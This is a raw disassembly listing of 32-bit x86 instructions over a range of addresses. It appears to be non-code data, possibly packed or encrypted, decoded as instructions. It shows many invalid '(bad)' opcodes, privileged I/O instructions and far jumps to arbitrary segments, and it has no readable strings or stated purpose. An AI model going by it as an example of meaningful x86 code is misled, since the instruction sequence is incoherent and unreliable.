  412395:	pop    eax
  412396:	leave  
  412397:	xchg   esi,eax
  412398:	cdq    
  412399:	imul   ecx,DWORD PTR [edi],0x38
  41239c:	jo     0x4123f9
  41239e:	mov    esi,0x6eb97915
  4123a3:	jge    0x4123a5
  4123a5:	dec    esp
  4123a6:	pop    ebx
  4123a7:	mov    al,0xca
  4123a9:	icebp  
  4123aa:	push   ss
  4123ab:	ss mov dh,0xad
  4123ae:	jl     0x41233f
  4123b0:	call   0x7194:0xf38d6280
  4123b7:	pop    eax
  4123b8:	push   0xbc02d8dc
  4123bd:	cdq    
  4123be:	jg     0x4123fa
  4123c0:	lock dec edi
  4123c2:	call   0x5deeac9c
  4123c7:	out    dx,al
  4123c8:	popf   
  4123c9:	add    ah,bl
  4123cb:	pop    esp
  4123cc:	pop    ebx
  4123cd:	inc    edi
  4123ce:	lods   eax,DWORD PTR ds:[esi]
  4123cf:	lods   eax,DWORD PTR ds:[esi]
  4123d0:	adc    BYTE PTR [ecx-0x400d794e],dh
  4123d6:	test   al,0x9a
  4123d8:	mov    dh,0xd6
  4123da:	inc    ebp
  4123db:	stc    
  4123dc:	dec    esi
  4123dd:	jmp    0x2350:0xf6058600
  4123e4:	(bad)  [edx+0x74]
  4123e7:	add    al,0xb0
  4123e9:	fisttp QWORD PTR [esi]
  4123eb:	mov    fs,WORD PTR [edi]
  4123ed:	das    
  4123ee:	jno    0x4123ae
  4123f0:	in     al,0x50
  4123f2:	mov    esp,DWORD PTR [edx+0x6cf74c11]
  4123f8:	add    ah,BYTE PTR [edx-0x45]
  4123fb:	sahf   
  4123fc:	mov    ch,0x9a
  4123fe:	xchg   edx,eax
  4123ff:	ins    BYTE PTR es:[edi],dx
  412400:	mov    DWORD PTR [eax],ebp
  412402:	pop    edi
  412403:	fidiv  DWORD PTR [esi-0x5d]
  412406:	ins    BYTE PTR es:[edi],dx
  412407:	stc    
  412408:	xor    eax,0x1130136f
  41240d:	push   edi
  41240e:	pop    esp
  41240f:	fcmovnb st,st(2)
  412411:	test   DWORD PTR ds:0xceb8bf59,ecx
  412417:	aaa    
  412418:	jae    0x412455
  41241a:	cmp    esi,eax
  41241c:	jne    0x41242e
  41241e:	ins    DWORD PTR es:[edi],dx
  41241f:	pop    ebx
  412420:	call   0x7c:0x89844aaa
  412427:	mov    eax,0xf25fb0b1
  41242c:	mov    BYTE PTR [ecx],dl
  41242e:	inc    edx
  41242f:	cmp    eax,0x41d4b1b8
  412434:	in     eax,dx
  412435:	lea    eax,[esi]
  412437:	ds ret 0xfefb
  41243b:	xor    eax,0xb442dadb
  412440:	push   es
  412441:	xor    esi,DWORD PTR [edx-0x4a04912]
  412447:	jecxz  0x4124b5
  412449:	pop    ebx
  41244a:	push   ebx
  41244b:	jno    0x4124b3
  41244d:	and    ch,BYTE PTR [ecx+0x32568371]
  412453:	dec    edx
  412454:	pop    ss
  412455:	sbb    ah,BYTE PTR [eax+0x4afc2a6e]
  41245b:	pop    eax
  41245c:	jmp    0x58db:0x712dd6f7
  412463:	push   0xfc6534bc
  412468:	inc    edx
  412469:	dec    BYTE PTR [eax]
  41246b:	(bad)  
  41246c:	arpl   bx,ax
  41246e:	(bad)  
  41246f:	imul   BYTE PTR ds:0x6400263b
  412475:	jmp    edi
  412477:	sub    eax,0x6dd5322b
  41247c:	mov    dh,0x74
  41247e:	xor    DWORD PTR [edi-0x3d52d46b],ebx
  412484:	ins    DWORD PTR es:[edi],dx
  412485:	popa   
  412486:	mov    BYTE PTR [edx+0xd01d1d0],dh
  41248c:	sbb    DWORD PTR [eax-0x78],esi
  41248f:	ins    DWORD PTR es:[edi],dx
  412490:	inc    ebx
  412491:	aad    0x6d
  412493:	jae    0x4124b4
  412495:	mov    dl,0xff
  412497:	mov    eax,ds:0xb685dba1
  41249c:	xor    DWORD PTR [eax+0x1c951ff1],0x8402ed70
  4124a6:	lea    ecx,[edi+0x56cd4576]
  4124ac:	es cli 
  4124ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4124af:	xor    BYTE PTR [eax+0x40c1076d],al
  4124b5:	xchg   edx,eax
  4124b6:	mov    ss,WORD PTR [ebx-0x25b719ce]
  4124bc:	test   DWORD PTR [esi+0x7eabfda9],esi
  4124c2:	aam    0x79
  4124c4:	pop    edi
  4124c5:	pop    ss
  4124c6:	xor    ah,BYTE PTR [ecx+0x5b]
  4124c9:	fdiv   DWORD PTR [esi]
  4124cb:	push   es
  4124cc:	pop    edx
  4124cd:	retf   
  4124ce:	clc    
  4124cf:	pop    esi
  4124d0:	or     edx,DWORD PTR [esi-0x73]
  4124d3:	fdiv   QWORD PTR [esi]
  4124d5:	fisubr DWORD PTR [ebp-0x4cf5fa8a]
  4124db:	bound  edx,QWORD PTR fs:[eax+0x76]
  4124df:	jnp    0x412462
  4124e1:	add    al,bl
  4124e3:	add    al,0xdd
  4124e5:	fwait
  4124e6:	iret   
  4124e7:	pop    esp
  4124e8:	add    al,al
  4124ea:	je     0x412491
  4124ec:	lods   eax,DWORD PTR ds:[esi]
  4124ed:	ins    DWORD PTR es:[edi],dx
  4124ee:	sbb    eax,DWORD PTR [ebp-0x13]
  4124f1:	push   cs
  4124f2:	sub    DWORD PTR [edx-0x5b2e28ad],eax
  4124f8:	jo     0x412525
  4124fa:	fcom   QWORD PTR [esi-0x5004c74a]
  412500:	enter  0x1479,0xa2
  412504:	push   es
  412505:	sub    ch,0xd6
  412508:	inc    ebp
  412509:	mov    dh,0x28
  41250b:	or     BYTE PTR [ebx+0x1de681],0x9a
  412512:	fcomp  DWORD PTR [edx]
  412514:	leave  
  412515:	xor    al,0xf8
  412517:	in     eax,dx
  412518:	sub    BYTE PTR [ecx-0x2f],dl
  41251b:	add    cl,al
  41251d:	mov    al,es:0xaec50ca4
  412523:	add    esp,DWORD PTR [eax-0x47]
  412526:	mov    ch,0x69
  412528:	sbb    esp,DWORD PTR [eax-0x7e286568]
  41252e:	shl    DWORD PTR [esi-0x647c55f3],1
  412534:	add    eax,0x54f5b698
  412539:	mov    ds:0xe1bba86,al
  41253e:	loop   0x412550
  412540:	sub    ecx,edi
  412542:	push   esi
  412543:	fmul   DWORD PTR [eax+0x1cdbdd0a]
  412549:	jmp    0x41250d
  41254b:	call   0x6714:0x56db6e20
  412552:	pop    esp
  412553:	fbstp  TBYTE PTR [ebp+0x10]
  412556:	adc    esi,0x9edc6c44
  41255c:	mov    ecx,0x478aa2a5
  412561:	scas   al,BYTE PTR es:[edi]
  412562:	jp     0x412505
  412564:	fstp   QWORD PTR [edx]
  412566:	loopne 0x41254d
  412568:	jnp    0x412540
  41256a:	push   0xffffff86
  41256c:	bound  ecx,QWORD PTR [ebp-0x5277832c]
  412572:	jo     0x4125df
  412574:	loop   0x41258c
  412576:	dec    edx
  412577:	push   ds
  412578:	jae    0x412536
  41257a:	inc    edi
  41257b:	aad    0x1
  41257d:	xor    al,0x34
  41257f:	pop    edx
  412580:	sub    ebp,edi
  412582:	imul   ecx,DWORD PTR [edi],0x7
  412585:	aad    0x42
  412587:	test   eax,0x91a9fda9
  41258c:	pop    esi
  41258d:	or     ah,BYTE PTR [edx-0x15]
  412590:	inc    esi
  412591:	inc    esp
  412592:	lahf   
  412593:	add    DWORD PTR [ecx],esp
  412595:	retf   0xdb80
  412598:	ret    0xeb6d
  41259b:	mov    ds:0xd70444d1,al
  4125a0:	loop   0x412525
  4125a2:	mov    al,ds:0x200f2670
  4125a7:	push   ss
  4125a8:	fiadd  DWORD PTR [esi]
  4125aa:	cmp    BYTE PTR [ebx-0x204f50a1],ah
  4125b0:	cs xchg esp,eax
  4125b2:	push   ss
  4125b3:	xchg   DWORD PTR [esi],esi
  4125b5:	es jg  0x412551
  4125b8:	sub    eax,0x6800371d
  4125bd:	rcl    BYTE PTR [ebx],cl
  4125bf:	mov    ch,0xb1
  4125c1:	sub    eax,0x9f4005eb
  4125c6:	or     DWORD PTR [edx],ecx
  4125c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4125c9:	push   0xfffffff9
  4125cb:	inc    edx
  4125cc:	mov    cl,0x22
  4125ce:	push   es
  4125cf:	popf   
  4125d0:	add    ch,bl
  4125d2:	sub    eax,0xec0173c
  4125d7:	xor    dl,0xcf
  4125da:	mov    ah,0xbc
  4125dc:	sbb    DWORD PTR [ebp-0x13],ebp
  4125df:	inc    esi
  4125e0:	popa   
  4125e1:	and    al,0xdb
  4125e3:	loop   0x41265a
  4125e5:	fisttp DWORD PTR [ebx]
  4125e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4125e8:	mov    ?,WORD PTR es:[ebp-0x554915d7]
  4125ef:	int    0xdd
  4125f1:	pop    eax
  4125f2:	push   cs
  4125f3:	xor    al,0x74
  4125f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4125f6:	sbb    dl,al
  4125f8:	(bad)  
  4125f9:	push   ecx
  4125fa:	in     eax,dx
  4125fb:	icebp  
  4125fc:	(bad)  
  4125fe:	cs inc ebp
  412600:	pop    ebx
  412601:	or     ebx,eax
  412603:	adc    edx,ebx
  412605:	add    ebx,edx
  412607:	div    DWORD PTR [esi+0x772c105d]
  41260d:	ins    BYTE PTR es:[edi],dx
  41260e:	je     0x4125a2
  412610:	dec    esi
  412611:	dec    edx
  412612:	jp     0x41267c
  412614:	stos   BYTE PTR es:[edi],al
  412615:	pop    ebx
  412616:	(bad)  ds:0x207a4184
  41261c:	xchg   cl,dl
  41261e:	aam    0xc5
  412620:	mov    dh,0xdd
  412622:	ss dec ebp
  412624:	pop    ss
  412625:	mov    eax,ds:0xb07a78f9
  41262a:	das    
  41262b:	mov    ch,0xbf
  41262d:	push   esp
  41262e:	fcom   DWORD PTR [ecx]
  412630:	pop    ds
  412631:	add    eax,0x9dc53d9c
  412636:	jge    0x412638
  412638:	mov    cl,0x48
  41263a:	pop    ebx
  41263b:	ins    DWORD PTR es:[edi],dx
  41263c:	test   eax,0x5f631628
  412641:	mov    ebx,0xedb6d59a
  412646:	inc    esi
  412647:	test   DWORD PTR [edx+0x6e],edx
  41264a:	and    BYTE PTR ds:0xbf5f5b0,bh
  412650:	rcl    DWORD PTR [esi-0x45],1
  412653:	loop   0x41264b
  412655:	push   0x6a7a70e3
  41265a:	leave  
  41265b:	mov    dh,0xb6
  41265d:	lods   eax,DWORD PTR ds:[esi]
  41265e:	ins    DWORD PTR es:[edi],dx
  41265f:	mov    DWORD PTR ds:[eax+ebp*2+0x7f],esi
  412664:	cmc    
  412665:	jbe    0x412683
  412667:	push   ss
  412668:	push   eax
  412669:	mov    ch,0x2d
  41266b:	(bad)  
  41266d:	and    al,BYTE PTR [esi-0x14]
  412670:	inc    ecx
  412671:	sbb    eax,0xb8aeda45
  412676:	sar    BYTE PTR [edx],1
  412678:	mov    bl,0x7c
  41267a:	mov    cl,ch
  41267c:	fidivr WORD PTR [ebx-0x3e]
  41267f:	xor    dl,BYTE PTR ds:0xbc976d2d
  412685:	pop    edi
  412686:	xor    dl,BYTE PTR [ebx-0x3b]
  412689:	inc    edi
  41268a:	cmp    esp,DWORD PTR [ebp+0x21320d85]
  412690:	jg     0x41263e
  412692:	xchg   esp,eax
  412693:	add    esp,DWORD PTR [ebx]
  412695:	sub    al,0x2c
  412697:	sub    eax,0x773fafdb
  41269c:	test   ecx,0xa0a01cec
  4126a2:	ror    BYTE PTR [edx],1
  4126a4:	and    eax,0x1bb8bfa2
  4126a9:	imul   ebx,ebx,0x76
  4126ac:	mov    ds:0x1d9f8a82,eax
  4126b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126b2:	add    al,0xb6
  4126b4:	jno    0x4126e8
  4126b6:	pop    esp
  4126b7:	ret    0xada5
  4126ba:	jo     0x4126e7
  4126bc:	mov    edx,cs
  4126be:	push   0xe42e95e6
  4126c3:	sbb    al,0xb5
  4126c5:	sbb    eax,0xcb0d85c5
  4126ca:	xchg   edx,eax
  4126cb:	cwde   
  4126cc:	lahf   
  4126cd:	mov    eax,ds:0x86c1141a
  4126d2:	mov    eax,0x124ed9dd
  4126d7:	xor    BYTE PTR [ecx+0x61],0x6b
  4126db:	add    dl,bl
  4126dd:	pop    ecx
  4126de:	mov    edi,0x29905f63
  4126e3:	sbb    al,BYTE PTR [edx+0x696ab44b]
  4126e9:	xchg   ebx,eax
  4126ea:	jge    0x41273b
  4126ec:	dec    esp
  4126ed:	mov    cs,eax
  4126ef:	shr    BYTE PTR [esi+0x14],1
  4126f2:	outs   dx,BYTE PTR ds:[esi]
  4126f3:	imul   esp,DWORD PTR [ecx],0x65
  4126f6:	jg     0x412734
  4126f8:	push   esp
  4126f9:	fild   WORD PTR ds:0xbb5b6db6
  4126ff:	add    al,0x57
  412701:	ror    dh,1
  412703:	lds    esi,FWORD PTR [edx+0x788c5eec]
  412709:	add    ecx,DWORD PTR ds:[eax+0x6541db1b]
  412710:	inc    edx
  412711:	cmovns ecx,ecx
  412714:	fild   DWORD PTR [edi-0x255fa7f3]
  41271a:	iret   
  41271b:	imul   eax,DWORD PTR [edx-0xb],0xffffffe2
  41271f:	aaa    
  412720:	mov    dh,0xad
  412722:	ret    0xec82
  412725:	pop    ebx
  412726:	and    eax,0x906c4499
  41272b:	mov    ch,0xa9
  41272d:	outs   dx,BYTE PTR ds:[esi]
  41272e:	ins    BYTE PTR es:[edi],dx
  41272f:	dec    ebp
  412730:	push   esp
  412731:	pop    edx
  412732:	jne    0x412766
  412734:	push   ds
  412735:	xor    edi,edx
  412737:	push   es
  412738:	inc    ecx
  412739:	pop    ebx
  41273a:	cmp    eax,DWORD PTR [eax]
  41273c:	scas   al,BYTE PTR es:[edi]
  41273d:	fstp   QWORD PTR [eax]
  41273f:	mov    BYTE PTR [edi],bl
  412741:	push   es
  412742:	add    ch,BYTE PTR [esi]
  412744:	xor    al,0x1e
  412746:	sbb    DWORD PTR [ebp+0x714c1043],esi
  41274c:	mov    eax,ds:0xf501b6dd
  412751:	js     0x4127c7
  412753:	enter  0x5c13,0xca
  412757:	cmp    DWORD PTR [eax-0x45],0x3544d1b1
  41275e:	jle    0x4127de
  412760:	mov    bh,0x5a
  412762:	xor    cl,BYTE PTR [ebx]
  412764:	je     0x412707
  412766:	sbb    BYTE PTR [ebx],0x6d
  412769:	clc    
  41276a:	cwde   
  41276b:	pop    ebp
  41276c:	xchg   BYTE PTR [ebx+0x5d],ch
  41276f:	push   0x51
  412771:	lods   eax,DWORD PTR ds:[esi]
  412772:	mov    eax,ds:0xdd554906
  412777:	mov    edx,0x3a8abada
  41277c:	icebp  
  41277d:	inc    eax
  41277e:	dec    edx
  41277f:	scas   al,BYTE PTR es:[edi]
  412780:	mov    edi,0x285fe528
  412785:	fsubr  QWORD PTR [ecx+0x3df1fc83]
  41278b:	cmp    BYTE PTR [ebx+0x7e2400],0x42
  412792:	popa   
  412793:	imul   ebx,esp,0xffffffda
  412796:	push   0x50
  412798:	das    
  412799:	(bad)  
  41279a:	xchg   ebp,eax
  41279b:	(bad)
  41279f:	sbb    al,0x75
  4127a1:	lds    ebp,FWORD PTR [ebp+0x63]
  4127a4:	inc    edi
  4127a5:	data16 clc 
  4127a7:	cmp    edx,ebp
  4127a9:	xchg   ebx,eax
  4127aa:	leave  
  4127ab:	fs call 0xe897:0x5f0be5b6
  4127b3:	add    BYTE PTR [edi],cl
  4127b5:	inc    ebp
  4127b6:	mov    bl,0xa0
  4127b8:	xchg   ebp,eax
  4127b9:	push   esi
  4127ba:	push   ss
  4127bb:	test   al,0x86
  4127bd:	fidiv  DWORD PTR [ebx+0x305eaf1c]
  4127c3:	fidiv  DWORD PTR [esi+0x29952c2c]
  4127c9:	(bad)  
  4127ca:	out    dx,al
  4127cb:	cli    
  4127cc:	shr    BYTE PTR [ecx+eiz*4],cl
  4127cf:	sub    al,0xb4
  4127d1:	or     ebx,ebx
  4127d3:	cld    
  4127d4:	add    eax,0x4dc9311c
  4127d9:	mov    DWORD PTR [ebx],edx
  4127db:	arpl   WORD PTR [eax-0x7b93efd5],sp
  4127e1:	push   eax
  4127e2:	rcl    DWORD PTR [ebp+0x6b44221],1
  4127e8:	xchg   BYTE PTR [ecx-0x27],al
  4127eb:	fwait
  4127ec:	mov    edx,0xb76b6081
  4127f1:	mov    esp,0xc55c4862
  4127f6:	(bad)  
  4127f7:	fstp   QWORD PTR [ebx]
  4127f9:	pop    ebx
  4127fa:	in     eax,dx
  4127fb:	inc    edx
  4127fc:	mov    al,ds:0x3a47673b
  412801:	scas   eax,DWORD PTR es:[edi]
  412802:	aad    0xac
  412804:	shr    BYTE PTR [esi+0x2c],1
  412807:	ins    DWORD PTR es:[edi],dx
  412808:	push   0xffc6cb8b
  41280d:	mov    ds:0xea8265d0,al
  412812:	cmp    BYTE PTR [edx+0x4087043a],0xd4
  412819:	(bad)  
  41281a:	(bad)  [esi-0x35f8dcb0]
  412820:	sti    
  412821:	imul   eax,DWORD PTR [eax+0x15c04492],0xdaa01b6c
  41282b:	add    eax,0x9feae1e
  412830:	jmp    0x359a:0xca1d6e08
  412837:	cli    
  412838:	ins    DWORD PTR es:[edi],dx
  412839:	loop   0x41289c
  41283b:	aam    0x76
  41283d:	fistp  DWORD PTR [eax-0x23]
  412840:	daa    
  412841:	pusha  
  412842:	jge    0x412839
  412844:	fninit 
  412846:	retf   
  412847:	pop    ds
  412848:	sbb    ebx,DWORD PTR [ebx]
  41284a:	pop    ebx
  41284b:	inc    ebx
  41284c:	jne    0x41287e
  41284e:	rcr    DWORD PTR [ecx-0x5e],1
  412851:	pop    edi
  412852:	js     0x412825
  412854:	ins    BYTE PTR es:[edi],dx
  412855:	mov    bh,0xba
  412857:	mov    ds:0x5b2464a6,al
  41285c:	call   0x373a734f
  412861:	fisubr DWORD PTR [ebp+0x6b]
  412864:	push   edi
  412865:	and    BYTE PTR [edi+0x86f2262],bl
  41286b:	fsubr  st,st(2)
  41286d:	aam    0x6d
  41286f:	imul   esi,DWORD PTR [edi-0x7fb9b3bd],0x77
  412876:	dec    eax
  412877:	sar    DWORD PTR [edi-0x3],1
  41287a:	mov    BYTE PTR [ebx+0x6d],bl
  41287d:	inc    edi
  41287e:	loopne 0x4128c3
  412880:	icebp  
  412881:	mov    al,0x7f
  412883:	retf   
  412884:	cdq    
  412885:	sbb    edx,ebp
  412887:	sub    BYTE PTR [esi],0x96
  41288a:	and    ebx,DWORD PTR [edi+0x768233ba]
  412890:	push   esp
  412891:	sbb    esp,DWORD PTR [eax+0x53]
  412894:	inc    eax
  412895:	dec    DWORD PTR [eax+0x1a0295bb]
  41289b:	out    dx,al
  41289c:	aaa    
  41289d:	in     eax,0x65
  41289f:	sbb    ebp,ebp
  4128a1:	jp     0x4128a7
  4128a3:	ins    DWORD PTR es:[edi],dx
  4128a4:	sbb    ebp,DWORD PTR [ebp-0x44]
  4128a7:	jno    0x4128fd
  4128a9:	pop    ss
  4128aa:	push   ebx
  4128ab:	scas   al,BYTE PTR es:[edi]
  4128ac:	aad    0x11
  4128ae:	jo     0x41291b
  4128b0:	lock xor bl,BYTE PTR [ebp+0x76978684]
  4128b7:	jmp    0x412839
  4128b9:	mov    eax,0xb058905e
  4128be:	mov    al,ds:0x62088d17
  4128c3:	inc    esp
  4128c4:	inc    edi
  4128c5:	shr    BYTE PTR [ebp-0xca3aa1b],1
  4128cb:	inc    ecx
  4128cc:	push   esi
  4128cd:	or     BYTE PTR [esi+0x680edb02],dh
  4128d3:	jecxz  0x412855
  4128d5:	sbb    al,BYTE PTR ss:[ecx]
  4128d8:	fcmovnb st,st(7)
  4128da:	jno    0x4128ab
  4128dc:	ret    0xc9b7
  4128df:	rcl    BYTE PTR [eax],0x74
  4128e2:	fisttp DWORD PTR [ebx]
  4128e4:	pop    ebp
  4128e5:	xor    cl,BYTE PTR [ebx+eax*4]
  4128e8:	pop    esi
  4128e9:	stc    
  4128ea:	lea    ebp,[ebp+0x23]
  4128ed:	sbb    eax,0xbde698bb
  4128f2:	push   eax
  4128f3:	mov    ebp,0xad939e00
  4128f8:	mov    al,ds:0x3a925be5
  4128fd:	call   0xf239de02
  412902:	lods   eax,DWORD PTR ds:[esi]
  412903:	inc    ebp
  412904:	adc    eax,0xf3e3266e
  412909:	mov    ch,0xf3
  41290b:	lods   eax,DWORD PTR ds:[esi]
  41290c:	or     ebx,DWORD PTR [ebx+0x53]
  41290f:	ror    DWORD PTR [ebx],1
  412911:	cs or  al,0xbf
  412914:	sub    DWORD PTR [edx],eax
  412916:	loop   0x412989
  412918:	scas   al,BYTE PTR es:[edi]
  412919:	mov    BYTE PTR [ebp+0x27a63a5],al
  41291f:	pop    ds
  412920:	(bad)  
  412921:	bound  ecx,QWORD PTR [ebx+0x4d]
  412924:	add    eax,0x85de6db
  412929:	fmul   QWORD PTR [ebp-0x61]
  41292c:	repnz in al,0x68
  41292f:	imul   ecx,DWORD PTR [edx+0x3854705b],0xffffffbe
  412936:	push   eax
  412937:	inc    ecx
  412938:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412939:	fidiv  DWORD PTR [esi-0x3d]
  41293c:	pusha  
  41293d:	ja     0x4128ee
  41293f:	sub    ah,BYTE PTR [ecx+0x7a32e35a]
  412945:	dec    ebp
  412946:	adc    eax,0xc1eb1617
  41294b:	mov    es,WORD PTR [esi]
  41294d:	sub    eax,0x2c6ea8f7
  412952:	ins    DWORD PTR es:[edi],dx
  412953:	sbb    eax,DWORD PTR [ebx]
  412955:	repnz sub DWORD PTR [edx+0x3c72d06b],eax
  41295c:	add    ecx,DWORD PTR [edx+0x5eb7f2db]
  412962:	test   eax,0xc56400
  412967:	lock pop edx
  412969:	jecxz  0x412905
  41296b:	add    DWORD PTR [ebx-0x15],edx
  41296e:	fdivr  DWORD PTR [edx]
  412970:	push   ebx
  412971:	jecxz  0x41291a
  412973:	scas   eax,DWORD PTR es:[edi]
  412974:	pop    ebp
  412975:	push   edx
  412976:	aam    0x95
  412978:	mov    al,0xb4
  41297a:	xor    eax,0xf2d81744
  41297f:	adc    DWORD PTR [eax],0xffffffc2
  412982:	jp     0x4129e5
  412984:	mov    ebx,DWORD PTR [eax-0x42]
  412987:	xchg   ecx,eax
  412988:	std    
  412989:	xor    DWORD PTR [eax],eax
  41298b:	(bad)  
  41298c:	(bad)  
  41298d:	cs jae 0x41291e
  412990:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412991:	xchg   al,ch
  412993:	inc    esi
  412994:	xor    eax,DWORD PTR [edx+0x4e]
  412997:	pop    ebx
  412998:	add    al,0x65
  41299a:	cs ins DWORD PTR es:[edi],dx
  41299c:	sub    al,0xb5
  41299e:	xchg   esp,eax
  41299f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4129a0:	(bad)  
  4129a2:	and    al,0x91
  4129a4:	clc    
  4129a5:	outs   dx,DWORD PTR ds:[esi]
  4129a6:	xchg   esp,eax
  4129a7:	adc    DWORD PTR [ebx],ecx
  4129a9:	cmp    ecx,DWORD PTR [eax-0x53d360dd]
  4129af:	push   esi
  4129b0:	(bad)  [eax+0x41]
  4129b3:	pop    es
  4129b4:	jg     0x4129ba
  4129b6:	(bad)  
  4129b7:	inc    ebp
  4129b8:	scas   al,BYTE PTR es:[edi]
  4129b9:	inc    ecx
  4129ba:	stos   BYTE PTR es:[edi],al
  4129bb:	ins    DWORD PTR es:[edi],dx
  4129bc:	add    eax,DWORD PTR [ecx]
  4129be:	rcr    DWORD PTR [esi+ebp*8],1
  4129c1:	fwait
  4129c2:	xor    DWORD PTR [eax+0x206da85d],esi
  4129c8:	cmp    al,BYTE PTR [edi]
  4129ca:	sbb    al,BYTE PTR [eax+0x3c02919b]
  4129d0:	pop    ebx
  4129d1:	test   eax,0x1288b4a0
  4129d6:	jecxz  0x412994
  4129d8:	dec    BYTE PTR [esi]
  4129da:	add    al,0x2d
  4129dc:	mov    ch,0xb
  4129de:	pop    esi
  4129df:	es cwde 
  4129e1:	imul   ecx,DWORD PTR [ebp-0xc],0xffffffb5
  4129e5:	dec    ebp
  4129e6:	add    DWORD PTR [esi+edi*4],ebp
  4129e9:	lds    edi,FWORD PTR [ebx+0x50]
  4129ec:	(bad)  [eax+eiz*4+0x23b8d858]
  4129f3:	loopne 0x4129d7
  4129f5:	push   ds
  4129f6:	xchg   esi,eax
  4129f7:	mov    eax,0x6b696d31
  4129fc:	sbb    esi,ebx
  4129fe:	mov    al,ds:0x834d1459
  412a03:	(bad)
  412a07:	mov    bl,BYTE PTR [ebp-0x40]
  412a0a:	and    ebx,esi
  412a0c:	mov    ds:0x69b4b490,al
  412a11:	mov    edx,esi
  412a13:	test   edx,ebp
  412a15:	dec    esp
  412a16:	mov    ch,0x77
  412a18:	sbb    ebx,esi
  412a1a:	les    esi,FWORD PTR [edx]
  412a1c:	in     eax,0x6a
  412a1e:	mov    ds:0xe0feec74,eax
  412a23:	cld    
  412a24:	push   ss
  412a25:	inc    edi
  412a26:	mov    bl,BYTE PTR [ebx-0x45]
  412a29:	mov    al,0x9a
  412a2b:	pop    ecx
  412a2c:	add    BYTE PTR [ebx],0x85
  412a2f:	push   ebx
  412a30:	pop    ecx
  412a31:	jp     0x412aad
  412a33:	popa   
  412a34:	(bad)  [esi-0x67]
  412a37:	fsub   QWORD PTR fs:[ebp+ebx*8+0x4a]
  412a3c:	out    dx,eax
  412a3d:	adc    al,0xfb
  412a3f:	fldenv [ecx-0x32bfb5ea]
  412a45:	cs mov esp,0x2bb0041c
  412a4b:	pusha  
  412a4c:	aas    
  412a4d:	xor    ecx,DWORD PTR [ecx+eax*8-0x46]
  412a51:	mov    bl,al
  412a53:	or     esp,DWORD PTR ss:[ebp+ebp*4-0x26]
  412a58:	xor    eax,0x7690b3d
  412a5d:	adc    BYTE PTR [edi],dl
  412a5f:	inc    ebx
  412a60:	das    
  412a61:	push   ds
  412a62:	iret   
  412a63:	test   ebx,0xc6c6d0bc
  412a69:	inc    edx
  412a6a:	lods   al,BYTE PTR ds:[esi]
  412a6b:	ins    BYTE PTR es:[edi],dx
  412a6c:	lahf   
  412a6d:	xor    BYTE PTR [esi],0x34
  412a70:	mov    al,ds:0xadcddb6d
  412a75:	cmp    ecx,DWORD PTR [ecx-0x36]
  412a78:	push   cs
  412a79:	inc    ebp
  412a7a:	retf   
  412a7b:	fist   WORD PTR [ebp-0x5ebd2d2b]
  412a81:	popa   
  412a82:	ins    DWORD PTR es:[edi],dx
  412a83:	call   0x419f0771
  412a88:	fist   DWORD PTR [esi]
  412a8a:	stos   BYTE PTR es:[edi],al
  412a8b:	outs   dx,BYTE PTR ds:[esi]
  412a8c:	clc    
  412a8d:	xlat   BYTE PTR ds:[ebx]
  412a8e:	dec    ecx
  412a8f:	imul   eax,DWORD PTR ds:0xd05b856d,0x36
  412a96:	add    DWORD PTR es:[edi],ebp
  412a99:	sbb    cl,BYTE PTR ds:0xeadb741
  412a9f:	stos   BYTE PTR es:[edi],al
  412aa0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412aa1:	add    eax,0xbe3d1282
  412aa6:	ins    BYTE PTR es:[edi],dx
  412aa7:	mov    eax,gs:0x3857945b
  412aad:	add    BYTE PTR [edx+0x56],0x6a
  412ab1:	and    esp,edx
  412ab3:	(bad)  
  412ab4:	cs mov esi,0x6bef5685
  412aba:	(bad)
  412abe:	(bad)  
  412abf:	ins    DWORD PTR es:[edi],dx
  412ac0:	mov    ds:0xbfff5151,eax
  412ac5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ac6:	sub    edx,DWORD PTR [ebx+ecx*1-0x78]
  412aca:	fist   DWORD PTR [esi-0x3f]
  412acd:	sbb    bh,cl
  412acf:	push   esi
  412ad0:	(bad)  
  412ad1:	(bad)  
  412ad2:	retf   0xc44d
  412ad5:	jbe    0x412a78
  412ad7:	ret    
  412ad8:	call   0x4303b5d7
  412add:	repnz mov dh,0xb
  412ae0:	sub    al,0x6c
  412ae2:	or     edi,DWORD PTR [edx]
  412ae4:	int    0x86
  412ae6:	int    0x19
  412ae8:	sub    al,0x9
  412aea:	adc    bl,bl
  412aec:	lods   eax,DWORD PTR ds:[esi]
  412aed:	or     DWORD PTR [eax-0x5bd68e70],ecx
  412af3:	bound  ecx,QWORD PTR [edx]
  412af5:	jmp    0x5bb678b1
  412afa:	push   0xe9d0facb
  412aff:	in     eax,0xc0
  412b01:	pop    ecx
  412b02:	xor    BYTE PTR [eax+0x6caa1ab9],bh
  412b08:	sbb    bh,BYTE PTR [edi+0x5a48986a]
  412b0e:	push   0x37
  412b10:	call   0x94ea:0xcfdfea20
  412b17:	fwait
  412b18:	mov    al,0xd0
  412b1a:	inc    ecx
  412b1b:	(bad)  [edx+0x56]
  412b1e:	push   eax
  412b1f:	out    0x6a,al
  412b21:	retf   0xa953
  412b24:	jmp    0xb8e5:0x7f3db888
  412b2b:	jne    0x412ade
  412b2d:	cs ins BYTE PTR es:[edi],dx
  412b2f:	mov    ah,0x6d
  412b31:	cli    
  412b32:	push   ebx
  412b33:	and    al,0xda
  412b35:	or     DWORD PTR [ecx+0x58],edi
  412b38:	repnz arpl bx,bx
  412b3b:	push   0xffffffbb
  412b3d:	or     BYTE PTR [ebp-0x33],cl
  412b40:	mov    eax,0x267fd98
  412b45:	pop    ebp
  412b46:	bound  eax,QWORD PTR [ebx+0x426b586d]
  412b4c:	xlat   BYTE PTR ds:[ebx]
  412b4d:	icebp  
  412b4e:	dec    edi
  412b4f:	or     edi,esp
  412b51:	adc    al,0xad
  412b53:	or     eax,0x2134b3b1
  412b58:	sar    BYTE PTR [ecx-0x27],1
  412b5b:	pop    eax
  412b5c:	sub    ch,bl
  412b5e:	push   0xffffffd4
  412b60:	xchg   edi,eax
